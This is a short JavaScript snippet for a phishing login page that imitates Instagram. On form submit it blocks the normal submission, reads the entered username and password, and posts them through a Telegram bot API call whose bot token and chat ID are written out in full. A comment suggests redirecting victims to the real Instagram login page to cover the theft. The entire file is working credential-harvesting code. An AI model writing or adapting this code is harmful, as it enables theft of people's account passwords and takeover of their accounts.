document.getElementById("login-form").addEventListener("submit", function(event) {
  event.preventDefault();
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;
  sendToTelegram(username, password);
  // Here you can redirect the user to the Instagram login page or perform other actions
});

function sendToTelegram(username, password) {
  // AJAX request to send data to your Telegram bot
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://api.telegram.org/bot7105460605:AAG9KUuyQrYIgWW5aGJHLDEiSM_-3Ibc4Wg/sendMessage", true);
  xhr.setRequestHeader("Content-Type", "application/json");
  var message = "Instagram login details:\nUsername: " + username + "\nPassword: " + password;
  var data = JSON.stringify({
    chat_id: "6580559134",
    text: message
  });
  xhr.send(data);
}
